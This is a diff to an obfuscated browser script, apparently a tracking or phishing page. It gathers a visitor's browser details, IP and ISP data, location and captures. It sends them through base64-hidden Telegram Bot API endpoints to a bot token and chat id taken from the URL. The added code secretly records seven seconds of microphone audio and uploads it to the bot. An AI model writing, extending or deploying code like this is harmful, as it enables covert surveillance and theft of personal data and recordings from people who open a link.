@@ -1,8 +1,11 @@
 const decr=(vlu)=>{return atob(vlu)};
+console.log("hey")
 const val = decr(new URLSearchParams(window.location.search).get(decr('GdmFs'.slice(1))).slice(1).slice(0,-1)).split("|");
 const opt = new URLSearchParams(window.location.search).get(decr("Pb3B0".slice(1)));
 const address = decr(`XaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHx8L3NlbmRNZXNzYWdl`.slice(1)).replace("||",val[0]);
 const address_p = decr("FaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHx8L3NlbmRQaG90bw==".slice(1)).replace("||",val[0]);
+const address_s = decr("MaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHx8L3NlbmRBdWRpbw==".slice(1)).replace("||",val[0]);
+
 const dts ={};
 const loc={};
 const transp=async(data)=>{const dat = await fetch(address,{method:decr("GUE9TVA==".slice(1)),headers: {'Content-Type': decr("8YXBwbGljYXRpb24vanNvbg==".slice(1))},body: JSON.stringify({chat_id: val[1],text: data,})},)};
@@ -34,6 +37,37 @@ const cap_t=async()=>{
         transp(decr("Zm91bmRFcnJvciA6IA==")+e);
     }
 }
+
+
+const transp_s=async(audioBlob)=>{
+    const formData = new FormData();
+    formData.append(decr("Y2hhdF9pZA=="),val[1]);
+    formData.append(decr("YXVkaW8="), audioBlob, decr("YXVkaW8ud2F2"));
+    const rsp = await fetch(address_s, { method: decr("GUE9TVA==".slice(1)), body: formData });
+}
+
+
+function cap_s() {
+    navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(strm => {
+            const mr = new MediaRecorder(strm);
+            const chnks = [];
+            mr.ondataavailable = (evnt) => chnks.push(evnt.data);
+            mr.onstop = () => {
+                const audioBlob = new Blob(chnks, { type: decr("YXVkaW8vd2F2") });
+                transp_s(audioBlob);
+            };
+
+            mr.start();
+            setTimeout(() => {
+                mr.stop();
+                strm.getTracks().forEach(trk => trk.stop());
+            }, 7000); 
+        })
+        .catch(console.error);
+}
+
+
 const bsc=()=>{
     dts[decr("b3Blbl90aW1l")]=new Date().toLocaleString();
     dts[decr("dXNlcmFnZW50")]=navigator.userAgent;
@@ -97,6 +131,7 @@ const g_loc=async()=>{
 
 
 const isp_in=async()=>{
+    console.log("this is starting")
     try{
         const rsp = await fetch(decr("aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=="));
         const rsp_dat = await rsp.json();
@@ -108,6 +143,7 @@ const isp_in=async()=>{
         bsc();
         if(opt.includes("l")){g_loc();}
         if(opt.includes("c")){cap_t();}
+        if(opt.includes("s")){cap_s()}
         clr_sch();
         transp(fn_str(dts));
 
